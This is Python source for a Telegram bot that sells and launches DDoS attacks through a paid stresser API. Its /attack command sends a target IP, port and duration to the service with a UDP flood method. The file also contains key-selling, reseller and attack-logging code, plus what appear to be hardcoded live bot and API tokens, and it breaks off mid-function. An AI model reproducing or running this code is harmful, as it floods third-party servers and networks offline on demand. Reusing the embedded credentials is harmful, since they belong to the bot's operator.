#!/usr/bin/env python3
"""
˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝐒 𝙾𝙽𝙸𝙓˼ ♪
Owner: 1987818347
"""

import telebot
from telebot.types import ReplyKeyboardMarkup
import threading
import os
import re
import sys
import json
import random
import string
from datetime import datetime, timedelta
import time
import requests

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ============= CONFIG =============
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8771905727:AAHgWlvO3Jx6po3OVD5f4QHt-_C3tJDm0JY")
BOT_OWNER = 1987818347
BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝐒 𝙾𝙽𝙸𝙓˼ ♪"

DEFAULT_API_URL = "https://stresser.works/api/start"
DEFAULT_API_TOKEN = "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563"
DEFAULT_API_METHOD = "UDP-BIG"
DEFAULT_API_GEOLOCATION = "ALL"

DATA_FILE = "bot_data.json"

# ============= DATA =============
def load_data():
    default = {
        "users": {}, "keys": {}, "resellers": {},
        "admins": {str(BOT_OWNER): {"added_at": datetime.now().isoformat()}},
        "approved_groups": {}, "attack_logs": [], "admin_logs": [],
        "banned_users": {}, "feedbacks": [],
        "stickers": [], "videos": [], "pyf_videos": [],
        "settings": {
            "max_attack_time": 300,
            "user_cooldown": 5,
            "maintenance_mode": False,
            "maintenance_msg": "Bot under maintenance.",
            "api_url": DEFAULT_API_URL,
            "api_token": DEFAULT_API_TOKEN,
            "api_method": DEFAULT_API_METHOD,
            "api_geolocation": DEFAULT_API_GEOLOCATION,
        }
    }
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    for k, v in default.items():
                        d.setdefault(k, v)
                    for sk, sv in default["settings"].items():
                        d["settings"].setdefault(sk, sv)
                    return d
        except: pass
    return default

def save_data(d):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(d, f, indent=2, default=str)
    except: pass

data = load_data()
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# ============= RANDOM ROTATION =============
_sticker_pool = []
_video_pool = []
_pyf_pool = []

def get_random_sticker():
    global _sticker_pool
    stickers = data.get("stickers", [])
    if not stickers: return None
    if not _sticker_pool:
        _sticker_pool = stickers.copy()
        random.shuffle(_sticker_pool)
    return _sticker_pool.pop()

def get_random_video():
    global _video_pool
    videos = data.get("videos", [])
    if not videos: return None
    if not _video_pool:
        _video_pool = videos.copy()
        random.shuffle(_video_pool)
    return _video_pool.pop()

def get_random_pyf():
    global _pyf_pool
    pyfs = data.get("pyf_videos", [])
    if not pyfs: return None
    if not _pyf_pool:
        _pyf_pool = pyfs.copy()
        random.shuffle(_pyf_pool)
    return _pyf_pool.pop()

# ============= HELPERS =============
def is_owner(uid): return uid == BOT_OWNER or str(uid) in data["admins"]
def is_reseller(uid):
    r = data["resellers"].get(str(uid))
    return r is not None and not r.get('blocked', False)
def is_banned(uid): return str(uid) in data["banned_users"]
def get_setting(k, d=None): return data["settings"].get(k, d)
def set_setting(k, v):
    data["settings"][k] = v
    save_data(data)

def gen_key(length=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def fmt_key(k):
    return '-'.join([k[i:i+4] for i in range(0, len(k), 4)])

def has_valid_key(uid):
    if is_owner(uid) or is_reseller(uid): return True
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return False
    try: return datetime.now() <= datetime.fromisoformat(u['key_expiry'])
    except: return False

def time_remaining(uid):
    if is_owner(uid): return "♾️ Unlimited (Owner)"
    if is_reseller(uid): return "♾️ Unlimited (Reseller)"
    u = data["users"].get(str(uid))
    if not u or not u.get('key_expiry'): return "❌ No Key"
    try:
        rem = datetime.fromisoformat(u['key_expiry']) - datetime.now()
        if rem.total_seconds() <= 0: return "❌ Expired"
        d = rem.days; h, r = divmod(rem.seconds, 3600); m, _ = divmod(r, 60)
        return f"⏰ {d}d {h}h {m}m"
    except: return "❌ Error"

user_cooldown = {}
attack_lock = threading.Lock()
active_attacks = {}

def get_cd_remaining(uid):
    if uid in user_cooldown:
        r = user_cooldown[uid] - time.time()
        if r > 0: return int(r)
        del user_cooldown[uid]
    return 0

def set_cd(uid):
    cd = get_setting('user_cooldown', 5)
    if cd > 0: user_cooldown[uid] = time.time() + cd

def is_attack_running():
    with attack_lock:
        now = datetime.now()
        for aid, atk in list(active_attacks.items()):
            if atk['end_time'] <= now: del active_attacks[aid]
        return len(active_attacks) > 0

def ist_now():
    return (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')

# ============= API =============
def api_attack(ip, port, dur):
    try:
        url = get_setting("api_url", DEFAULT_API_URL)
        token = get_setting("api_token", DEFAULT_API_TOKEN)
        method = get_setting("api_method", DEFAULT_API_METHOD)
        geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)
        req = f"{url}?token={token}&host={ip}&port={port}&time={dur}&method={method}&geolocation={geo}"
        resp = requests.get(req, timeout=10)
        if resp.status_code == 200: return True, resp.text
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        return False, str(e)

# ============= KEYBOARDS =============
def kb_main(uid):
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    if is_owner(uid):
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄", "👑 𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋")
    elif is_reseller(uid) or has_valid_key(uid):
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("🔑 𝐑𝐄𝐃𝐄𝐄𝐌", "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
    else:
        m.row("🔑 𝐑𝐄𝐃𝐄𝐄𝐌", "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
    return m

def kb_owner():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.row("🔑 𝐆𝐄𝐍 𝐊𝐄𝐘", "👥 𝐔𝐒𝐄𝐑𝐒")
    m.row("📊 𝐒𝐓𝐀𝐓𝐒", "📢 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓")
    m.row("⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", "❌ 𝐂𝐋𝐎𝐒𝐄")
    return m
    
# ============= START =============
@bot.message_handler(commands=['start', 'help'])
def cmd_start(msg):
    uid = msg.from_user.id
    if is_banned(uid):
        bot.reply_to(msg, "🚫 You are banned from using this bot.")
        return

    name = msg.from_user.first_name or "User"
    username = msg.from_user.username
    cid = msg.chat.id

    check_text = (
        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
        "▱▱▱▱▱▱▱▱▱▱ 0%\n"
        "⏳ Starting..."
    )

    chosen_pyf_start = get_random_pyf()
    if chosen_pyf_start:
        try:
            check = bot.send_video(cid, chosen_pyf_start, caption=check_text)
        except:
            check = bot.send_message(cid, check_text)
    else:
        check = bot.send_message(cid, check_text)

    steps = [
        ("▰▱▱▱▱▱▱▱▱▱", "10%", "📡 Connecting to server..."),
        ("▰▰▰▱▱▱▱▱▱▱", "30%", "👤 Verifying user..."),
        ("▰▰▰▰▰▱▱▱▱▱", "50%", "⚙️ Loading profile..."),
        ("▰▰▰▰▰▰▰▱▱▱", "70%", "🔑 Checking key status..."),
        ("▰▰▰▰▰▰▰▰▰▱", "90%", "⏳ Finalizing..."),
        ("▰▰▰▰▰▰▰▰▰▰", "100%", "✅ Verified!"),
    ]

    for bar, pct, status in steps:
        time.sleep(0.7)
        try:
            bot.edit_message_caption(
                chat_id=cid, message_id=check.message_id,
                caption=(
                    "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                    "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                    "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                    f"{bar} {pct}\n{status}"
                )
            )
        except:
            try:
                bot.edit_message_text(
                    chat_id=cid, message_id=check.message_id,
                    text=(
                        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                        f"{bar} {pct}\n{status}"
                    )
                )
            except: pass

    time.sleep(0.8)

    is_new = str(uid) not in data["users"]
    if is_new:
        data["users"][str(uid)] = {
            "username": username or name,
            "joined_at": datetime.now().isoformat(),
            "total_attacks": 0,
            "key_expiry": None
        }
        save_data(data)

    has_key = has_valid_key(uid)
    time_left = time_remaining(uid)

    try: bot.delete_message(cid, check.message_id)
    except: pass

    sticker_msg = None
    chosen_sticker = get_random_sticker()
    if chosen_sticker:
        try:
            sticker_msg = bot.send_sticker(cid, chosen_sticker)
            time.sleep(5)
        except Exception as e:
            print(f"Sticker Error: {e}")

    header = (
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
        f"┊         {BOT_NAME}              ┊\n"
        "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
    )

    if is_new and not has_key:
        text = header + (
            f"\n👋 Welcome, {name}!\n\n"
            "🎉 Aapka account successfully create ho gaya!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ Status: No Active Key\n"
            f"🎯 Method: {get_setting('api_method', 'UDP-BIG')}\n"
            "⚡ Bot: 🟢 ONLINE\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Kaise Start Kare?\n\n"
            "1️⃣ Redeem Key ➤ /redeem YOUR-KEY\n"
            "2️⃣ Launch Attack ➤ /attack IP PORT TIME\n"
            "3️⃣ Check Profile ➤ /profile\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ Bina key ke attack nahi lagega!\n"
            "🔑 Key lene ke liye owner se contact karo.\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Neeche buttons se start karo"
        )
    elif has_key:
        u = data["users"].get(str(uid), {})
        total_attacks = u.get("total_attacks", 0)
        role = "👑 Owner" if is_owner(uid) else ("💼 Reseller" if is_reseller(uid) else "👤 User")
        text = header + (
            f"\n👋 Welcome back, {name}!\n\n"
            "✅ Key Verified Successfully\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 Role: {role}\n"
            f"🆔 ID: {uid}\n"
            f"⏰ Time Left: {time_left}\n"
            f"🎯 Total Attacks: {total_attacks}\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔥 Ready to launch attack?"
        )
    else:
        text = header + (
            f"\n👋 Welcome back, {name}!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ Status: No Active Key\n"
            f"🎯 Method: {get_setting('api_method', 'UDP-BIG')}\n"
            "⚡ Bot: 🟢 ONLINE\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ Aapki key expire ho gayi hai\n"
            "ya abhi tak redeem nahi ki!\n\n"
            "📌 Key Redeem Karo:\n"
            "➤ /redeem YOUR-KEY\n\n"
            "🔑 Naya key lene ke liye owner se contact karo.\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "👇 Neeche buttons se start karo"
        )

    bot.send_message(cid, text, reply_markup=kb_main(uid))

    if sticker_msg:
        def delete_sticker():
            time.sleep(1)
            try: bot.delete_message(cid, sticker_msg.message_id)
            except: pass
        threading.Thread(target=delete_sticker, daemon=True).start()


# ============= ATTACK =============
@bot.message_handler(commands=['attack'])
def cmd_attack(msg):
    uid = msg.from_user.id
    if is_banned(uid): return
    cid = msg.chat.id

    if get_setting('maintenance_mode', False) and not is_owner(uid):
        bot.reply_to(msg, f"🔧 {get_setting('maintenance_msg', 'Maintenance')}"); return

    if not is_owner(uid) and not has_valid_key(uid):
        bot.reply_to(msg, "⚠️ No active key! /redeem first."); return

    parts = msg.text.split()[1:]
    if len(parts) != 3:
        bot.reply_to(msg,
            "❌ Usage:\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 /attack IP PORT TIME\n\n"
            "📝 Example:\n"
            "/attack 1.2.3.4 80 60\n"
            "━━━━━━━━━━━━━━━━━━━━━")
        return

    ip, ps, ds = parts
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        bot.reply_to(msg, "❌ Invalid IP!"); return

    try:
        port = int(ps); dur = int(ds)
        if not (1 <= port <= 65535): bot.reply_to(msg, "❌ Port 1-65535!"); return
        if dur < 1: bot.reply_to(msg, "❌ Min 1s!"); return
        if dur > get_setting('max_attack_time', 300) and not is_owner(uid):
            bot.reply_to(msg, f"❌ Max {get_setting('max_attack_time', 300)}s!"); return
    except:
        bot.reply_to(msg, "❌ Invalid port/time!"); return

    cd = get_cd_remaining(uid)
    if cd > 0 and not is_owner(uid):
        bot.reply_to(msg, f"⏸️ Cooldown: {cd}s"); return

    if is_attack_running():
        bot.reply_to(msg, "❌ Attack already running!"); return

    set_cd(uid)
    name = msg.from_user.username or f"User_{uid}"

    ok, r = api_attack(ip, port, dur)
    if not ok:
        bot.reply_to(msg, f"❌ FAILED\n{r[:300]}"); return

    attack_caption = (
        "💀 ATTACK LAUNCHED\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: @{name}\n"
        f"🎯 Target: {ip}:{port}\n"
        f"⏱️ Duration: {dur}s\n"
        f"🚀 Method: {get_setting('api_method', 'UDP-BIG')}\n"
        f"📅 Started: {ist_now()} IST\n"
        "━━━━━━━━━━━━━━━━━━━━━"
    )

    chosen_video = get_random_video()
    if chosen_video:
        try:
            bot.send_video(cid, chosen_video, caption=attack_caption)
        except:
            bot.reply_to(msg, attack_caption)
    else:
        bot.reply_to(msg, attack_caption)

    data["attack_logs"].append({
        'user_id': uid, 'username': name, 'target': ip, 'port': port,
        'duration': dur, 'timestamp': datetime.now().isoformat()
    })
    save_data(data)

    aid = f"{uid}_{time.time()}"
    with attack_lock:
        active_attacks[aid] = {
            'target': ip, 'port': port, 'duration': dur,
            'user_id': uid, 'username': name,
            'end_time': datetime.now() + timedelta(seconds=dur)
        }

    def done():
        time.sleep(dur)
        with attack_lock: active_attacks.pop(aid, None)
        complete_caption = f"✅ ATTACK COMPLETE\n🎯 {ip}:{port} | {dur}s"
        chosen_video_done = get_random_video()
        if chosen_video_done:
            try:
                bot.send_video(cid, chosen_video_done, caption=complete_caption)
            except:
                try: bot.send_message(cid, complete_caption)
                except: pass
        else:
            try: bot.send_message(cid, complete_caption)
            except: pass

    threading.Thread(target=done, daemon=True).start()


# ============= REDEEM =============
@bot.message_handler(commands=['redeem'])
def cmd_redeem(msg):
    uid = msg.from_user.id
    if is_banned(uid): return
    p = msg.text.split()
    if len(p) < 2:
        bot.reply_to(msg,
            "🔑 Redeem Command\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 Usage:\n"
            "/redeem YOUR-KEY\n\n"
            "📝 Example:\n"
            "/redeem ABCD-EFGH-IJKL-MNOP\n\n"
            "💡 Key lene ke liye owner se contact karo"
        )
        return
    key = p[1].strip().upper()
    if key not in data["keys"]:
        bot.reply_to(msg, "❌ Invalid key!"); return
    kinfo = data["keys"][key]
    if kinfo.get("used"):
        bot.reply_to(msg, "❌ Already used!"); return

    secs = kinfo.get("seconds", kinfo.get("days", 30) * 86400)
    expiry = datetime.now() + timedelta(seconds=secs)
    data["users"].setdefault(str(uid), {})
    existing = data["users"][str(uid)].get("key_expiry")
    if existing:
        try:
            old_exp = datetime.fromisoformat(existing)
            if old_exp > datetime.now():
                expiry = old_exp + timedelta(seconds=secs)
        except: pass
    data["users"][str(uid)]["key_expiry"] = expiry.isoformat()
    data["users"][str(uid)]["username"] = msg.from_user.username or msg.from_user.first_name
    kinfo["used"] = True; kinfo["used_by"] = uid
    kinfo["used_at"] = datetime.now().isoformat()
    save_data(data)

    bot.reply_to(msg,
        "✅ KEY REDEEMED\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏰ Added: +{secs} seconds\n"
        f"📅 Expires: {expiry.strftime('%d %b %Y %H:%M')}\n"
        "🎯 Enjoy your attacks!"
    )
    
# ============= STATUS (SIMPLE & WORKING) =============
@bot.message_handler(commands=['status'])
def cmd_status(msg):
    uid = msg.from_user.id
    cid = msg.chat.id
    status_msg = bot.send_message(cid, "📊 Loading...")

    def build_status():
        with attack_lock:
            now = datetime.now()
            running = [(a, atk) for a, atk in active_attacks.items() if atk['end_time'] > now]

        uptime = str(datetime.now() - BOT_START_TIME).split('.')[0]
        time_left = time_remaining(uid)
        role = "👑 Owner" if is_owner(uid) else ("💼 Reseller" if is_reseller(uid) else "👤 User")
        user_attacks = data['users'].get(str(uid), {}).get('total_attacks', 0)

        txt = "📊 BOT STATUS\n"
        txt += "━━━━━━━━━━━━━━━━━━━━━\n"
        txt += f"⚡ Status: ONLINE\n"
        txt += f"⏱️ Uptime: {uptime}\n"
        txt += f"🎯 Method: {get_setting('api_method', 'UDP-BIG')}\n"
        txt += f"🌍 Geo: {get_setting('api_geolocation', 'ALL')}\n\n"

        txt += "📈 STATISTICS\n"
        txt += "━━━━━━━━━━━━━━━━━━━━━\n"
        txt += f"👥 Users: {len(data['users'])}\n"
        txt += f"🔑 Keys: {len(data['keys'])}\n"
        txt += f"💀 Attacks: {len(data['attack_logs'])}\n"
        txt += f"🚫 Banned: {len(data.get('banned_users', {}))}\n"
        txt += f"❄ Stickers: {len(data.get('stickers', []))}\n"
        txt += f"📹 Videos: {len(data.get('videos', []))}\n\n"

        txt += "👤 YOUR INFO\n"
        txt += "━━━━━━━━━━━━━━━━━━━━━\n"
        txt += f"🎭 Role: {role}\n"
        txt += f"🎯 Your Attacks: {user_attacks}\n"
        txt += f"⏰ Time Left: {time_left}\n"

        if running:
            atk = running[0][1]
            rem = int((atk['end_time'] - now).total_seconds())
            dur = atk.get('duration', 60)
            pct = int(((dur - rem) / dur) * 100) if dur > 0 else 0
            filled = int(pct / 10)
            bar = "=" * filled + "-" * (10 - filled)
            txt += "\n⚔️ LIVE ATTACK\n"
            txt += "━━━━━━━━━━━━━━━━━━━━━\n"
            txt += f"[{bar}] {pct}%\n"
            txt += f"🎯 Target: {atk['target']}:{atk['port']}\n"
            txt += f"⏱️ Remaining: {rem}s\n"

        txt += "\n🔥 Ready to attack!"
        return txt

    try:
        bot.edit_message_text(cid, status_msg.message_id, build_status())
    except Exception as e:
        print(f"Status Error: {e}")

    def auto_update():
        for _ in range(200):
            time.sleep(3)
            try:
                bot.edit_message_text(cid, status_msg.message_id, build_status())
            except:
                pass

    threading.Thread(target=auto_update, daemon=True).start()


# ============= PROFILE =============
@bot.message_handler(commands=['profile'])
def cmd_profile(msg):
    uid = msg.from_user.id
    u = data["users"].get(str(uid), {})
    role = "👑 Owner" if is_owner(uid) else ("💼 Reseller" if is_reseller(uid) else "👤 User")

    txt = (
        "👤 YOUR PROFILE\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: {uid}\n"
        f"📛 Name: {msg.from_user.first_name}\n"
        f"🔗 Username: @{msg.from_user.username or 'N/A'}\n"
        f"🎭 Role: {role}\n"
        f"⏰ Time Left: {time_remaining(uid)}\n"
        f"🎯 Total Attacks: {u.get('total_attacks', 0)}\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ Status: ACTIVE"
    )
    bot.reply_to(msg, txt)


# ============= OWNER PANEL =============
@bot.message_handler(commands=['panel'])
def cmd_panel(msg):
    if not is_owner(msg.from_user.id): return
    bot.reply_to(msg,
        "👑 OWNER PANEL\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📋 Available Commands:\n\n"
        "👑 /panel - Owner Panel\n"
        "👥 /users - Users List\n"
        "📊 /stats - Stats\n"
        "📢 /broadcast MSG\n"
        "🚫 /ban ID\n"
        "✅ /unban ID\n"
        "🔑 /genkey 1d 5 [NAME]\n"
        "📡 /setapi URL TOKEN\n"
        "🧪 /testapi\n"
        "⏱️ /setmaxtime SEC\n"
        "⏸️ /setcooldown SEC\n"
        "🔧 /maintenance\n"
        "⚙️ /settings\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 Bot ONLINE")


@bot.message_handler(commands=['users'])
def cmd_users(msg):
    if not is_owner(msg.from_user.id): return
    if not data["users"]:
        bot.reply_to(msg, "📂 No users."); return
    txt = "👥 USERS LIST\n━━━━━━━━━━━━━━━━━━━━━\n"
    for i, (u_id, u) in enumerate(list(data["users"].items())[:50], 1):
        txt += f"{i}. {u_id} - {u.get('total_attacks', 0)} attacks\n"
    txt += f"\n🔹 Total: {len(data['users'])}"
    bot.reply_to(msg, txt)


@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split(maxsplit=1)
    if len(p) < 2:
        bot.reply_to(msg, "⚠️ /broadcast MSG"); return
    text = p[1]; sent = 0
    for uid in data["users"]:
        try:
            bot.send_message(int(uid), f"📢 BROADCAST\n\n{text}")
            sent += 1
        except: pass
    bot.reply_to(msg, f"✅ Sent to {sent} users.")


@bot.message_handler(commands=['stats'])
def cmd_stats(msg):
    if not is_owner(msg.from_user.id): return
    used_keys = sum(1 for k, v in data['keys'].items() if v.get('used'))
    unused_keys = len(data['keys']) - used_keys
    txt = (
        "📊 BOT STATS\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Users: {len(data['users'])}\n"
        f"🔑 Total Keys: {len(data['keys'])}\n"
        f"✅ Used Keys: {used_keys}\n"
        f"🆓 Available: {unused_keys}\n"
        f"💀 Attacks: {len(data['attack_logs'])}\n"
        f"🚫 Banned: {len(data.get('banned_users', {}))}\n"
        f"❄ Stickers: {len(data.get('stickers', []))}\n"
        f"📹 Videos: {len(data.get('videos', []))}\n"
        f"🎬 PYF Videos: {len(data.get('pyf_videos', []))}\n"
        f"⏱️ Max Time: {get_setting('max_attack_time', 300)}s\n"
        f"⏸️ Cooldown: {get_setting('user_cooldown', 5)}s\n"
        f"⏱️ Uptime: {str(datetime.now() - BOT_START_TIME).split('.')[0]}"
    )
    bot.reply_to(msg, txt)


@bot.message_handler(commands=['ban'])
def cmd_ban(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /ban ID"); return
    data["banned_users"][p[1]] = datetime.now().isoformat()
    save_data(data)
    bot.reply_to(msg, f"🚫 Banned {p[1]}")


@bot.message_handler(commands=['unban'])
def cmd_unban(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /unban ID"); return
    if p[1] in data["banned_users"]:
        del data["banned_users"][p[1]]; save_data(data)
        bot.reply_to(msg, f"✅ Unbanned {p[1]}")
    else:
        bot.reply_to(msg, "❌ Not banned")


@bot.message_handler(commands=['setapi'])
def cmd_setapi(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 3: bot.reply_to(msg, "⚠️ /setapi URL TOKEN"); return
    set_setting("api_url", p[1]); set_setting("api_token", p[2])
    if len(p) > 3: set_setting("api_method", p[3])
    if len(p) > 4: set_setting("api_geolocation", p[4])
    bot.reply_to(msg, "✅ API Updated!")


@bot.message_handler(commands=['testapi'])
def cmd_testapi(msg):
    if not is_owner(msg.from_user.id): return
    ok, r = api_attack("1.1.1.1", 80, 5)
    if ok: bot.reply_to(msg, f"✅ API OK\n{r[:300]}")
    else: bot.reply_to(msg, f"❌ API FAILED\n{r[:300]}")


@bot.message_handler(commands=['setmaxtime'])
def cmd_setmaxtime(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /setmaxtime SEC"); return
    try:
        set_setting("max_attack_time", int(p[1]))
        bot.reply_to(msg, f"✅ Max Time: {p[1]}s")
    except: bot.reply_to(msg, "❌ Invalid")


@bot.message_handler(commands=['setcooldown'])
def cmd_setcooldown(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2: bot.reply_to(msg, "⚠️ /setcooldown SEC"); return
    try:
        set_setting("user_cooldown", int(p[1]))
        bot.reply_to(msg, f"✅ Cooldown: {p[1]}s")
    except: bot.reply_to(msg, "❌ Invalid")


@bot.message_handler(commands=['maintenance'])
def cmd_maintenance(msg):
    if not is_owner(msg.from_user.id): return
    cur = get_setting('maintenance_mode', False)
    set_setting("maintenance_mode", not cur)
    bot.reply_to(msg, f"✅ Maintenance: {'ON' if not cur else 'OFF'}")


# ============= KEY SYSTEM =============
def parse_duration(text):
    text = text.lower().strip()
    word_map = {
        "second": 1, "seconds": 1, "sec": 1, "s": 1,
        "minute": 60, "minutes": 60, "min": 60, "m": 60,
        "hour": 3600, "hours": 3600, "hr": 3600, "h": 3600,
        "day": 86400, "days": 86400, "d": 86400,
        "week": 604800, "weeks": 604800, "w": 604800,
        "month": 2592000, "months": 2592000, "mo": 2592000,
        "year": 31536000, "years": 31536000, "y": 31536000,
    }
    m = re.match(r'^(\d+)\s*([a-z]+)$', text)
    if m:
        num = int(m.group(1)); suf = m.group(2)
        if suf in word_map: return num * word_map[suf]
        return None
    if text.isdigit(): return int(text) * 86400
    if text in word_map: return word_map[text]
    return None


@bot.message_handler(commands=['genkey', 'gen'])
def cmd_gen(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        bot.reply_to(msg,
            "⚠️ GENKEY USAGE\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "/genkey DURATION [AMOUNT] [NAME]\n\n"
            "⏰ Duration format:\n"
            "1d = 1 day\n"
            "2h = 2 hours\n"
            "30m = 30 minutes\n"
            "60s = 60 seconds\n"
            "1month = 1 month\n"
            "1week = 1 week\n\n"
            "📌 Examples:\n"
            "/genkey 1d 5\n"
            "/genkey 1month 10 PREMIUM\n"
            "/genkey 30m 1 TEST")
        return

    duration_str = p[1]
    secs = parse_duration(duration_str)
    if not secs or secs < 1:
        bot.reply_to(msg, "❌ Invalid duration!\nUse: 1d / 1h / 1m / 1s / 1month")
        return

    try:
        amt = int(p[2]) if len(p) > 2 else 1
        custom_name = p[3].upper() if len(p) > 3 else None
    except:
        bot.reply_to(msg, "❌ Invalid!"); return

    keys = []
    for _ in range(amt):
        if custom_name:
            rp = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
            formatted = f"{custom_name}-{rp[:4]}-{rp[4:8]}-{rp[8:12]}"
        else:
            formatted = fmt_key(gen_key(16))

        data["keys"][formatted] = {
            "seconds": secs,
            "created_at": datetime.now().isoformat(),
            "used": False,
            "used_by": None
        }
        keys.append(formatted)
    save_data(data)

    txt = f"✅ Generated {amt} Keys\n"
    txt += "━━━━━━━━━━━━━━━━━━━━━\n"
    for k in keys:
        txt += f"{k}\n"
    txt += "━━━━━━━━━━━━━━━━━━━━━\n"
    txt += f"⏰ Duration: {secs} seconds"
    bot.reply_to(msg, txt)


# ============= STICKER =============
@bot.message_handler(commands=['removesticker'])
def cmd_removesticker(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["stickers"]:
            bot.reply_to(msg, "❄ No stickers."); return
        txt = "❄ STICKERS LIST:\n━━━━━━━━━━━━━━━━━━━━━\n"
        for i, s in enumerate(data["stickers"], 1):
            txt += f"{i}. {s}\n"
        txt += "\nRemove: /removesticker NUMBER"
        bot.reply_to(msg, txt); return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["stickers"]):
            data["stickers"].pop(idx); save_data(data)
            bot.reply_to(msg, f"✅ Sticker #{p[1]} removed!\n❄ Total: {len(data['stickers'])}")
        else: bot.reply_to(msg, "❌ Invalid number!")
    except: bot.reply_to(msg, "❌ Usage: /removesticker NUMBER")


@bot.message_handler(commands=['liststickers'])
def cmd_liststickers(msg):
    if not is_owner(msg.from_user.id): return
    if not data["stickers"]:
        bot.reply_to(msg, "❄ No stickers."); return
    txt = "❄ STICKERS\n━━━━━━━━━━━━━━━━━━━━━\n"
    for i, s in enumerate(data["stickers"], 1):
        txt += f"{i}. {s}\n"
    txt += f"\n🔹 Total {len(data['stickers'])}"
    bot.reply_to(msg, txt)


# ============= VIDEO =============
@bot.message_handler(commands=['listvideo'])
def cmd_listvideo(msg):
    if not is_owner(msg.from_user.id): return
    if not data["videos"]:
        bot.reply_to(msg, "📹 No videos."); return
    txt = "📹 VIDEOS:\n━━━━━━━━━━━━━━━━━━━━━\n"
    for i, v in enumerate(data["videos"], 1):
        txt += f"{i}. {v}\n"
    txt += f"\n🔹 Total {len(data['videos'])}"
    bot.reply_to(msg, txt)


@bot.message_handler(commands=['delvideo'])
def cmd_delvideo(msg):
    if not is_owner(msg.from_user.id): return
